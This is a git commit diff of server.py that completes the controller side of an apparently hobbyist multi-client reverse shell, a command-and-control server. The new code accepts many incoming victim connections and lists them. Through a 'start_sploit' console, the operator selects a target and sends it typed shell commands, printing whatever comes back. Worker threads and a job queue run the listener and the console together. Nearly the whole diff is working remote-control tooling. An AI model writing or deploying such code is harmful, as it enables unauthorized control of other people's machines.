d6d24c269d19bb25bb7e374b2495351819620305
Nisal Priyanka <30996250+NisalPriyanka@users.noreply.github.com>
2018-12-06 11:54:50 +0530

    Server_complete

--- server.py
+++ server.py
@@ -4,7 +4,7 @@ import threading
 import time
 from queue import Queue
 
-#variables
+
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1,2]
 queue = Queue()
@@ -40,28 +40,6 @@ def socket_binding():
         print(str(msg)+" Trying... ")
         socket_binding()
 
-#Accept socket connection throught port
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection is established! IP : " + str(address[0]) + "|" + str(address[1]))
-    send_commands(conn)
-    conn.close()
-
-def send_commands(conn):
-    while True:
-        #getting user input via keyboard
-        cmd = input()
-        #Close all connections if user type quit in console
-        if cmd == "quit":
-            conn.close()
-            s.close()
-            sys.exit()
-        #if client issue word more than 0
-        if len(str.encode(cmd))>0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024),"utf-8")
-            print(client_response, end="")
-
 
 def accept_connection():
     #close all curently available connections
@@ -79,6 +57,7 @@ def accept_connection():
             all_address.append(address)
             print("\nConnection has Established: "+address[0])
 
+
         except:
             print("Error Accepting connection")
 
@@ -90,9 +69,9 @@ def start_sploit():
     if cmd == "list":
         list_connections()
     elif 'select' in cmd:
-        conn = get_target()
-        #if conn is not None:
-            #send_target_commands(conn)
+        conn = get_target(cmd)
+        if conn is not None:
+            send_target_commands(conn)
     else:
         print("Command not recognized!!")
 
@@ -106,20 +85,64 @@ def list_connections():
             del all_connection[i]
             del all_address[i]
             continue
-        results += str(i)+' '+str(all_address[i][0]+' '+all_address[i][1]+'\n')
+        results += str(i)+ ' ' +str(all_address[i][0]) +'  '+ str(all_address[i][1])+ '\n'
 
     print("-----CLIENTS----- \n" + results)
 
-def get_target():
-    print('GET TARGET')
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')
+        target = int(target)
+        conn = all_connection[target]
+        print("You are now connected to "+str(all_address[target][0]))
+        print(str(all_address[target][0]) + '> ', end="")
+        return conn
+    except:
+        print("Not a valid Connection")
+        return None
+
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480),"utf-8")
+                print(client_response , end="")
+            if cmd == 'quit':
+                break
+        except:
+            print("Connection was lost!")
+            break
+
+#create worker thread
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+#Do the next job in queue
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            socket_create()
+            socket_binding()
+            accept_connection()
+        if x == 2:
+            start_sploit()
+        queue.task_done()
+
+#each list iteam is a new job
+def create_job():
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
+#SERVER START
+create_workers()
+create_job()
 
 
 
-
-def main():
-    socket_create()
-    socket_binding()
-    accept_connection()
-
-
-main()
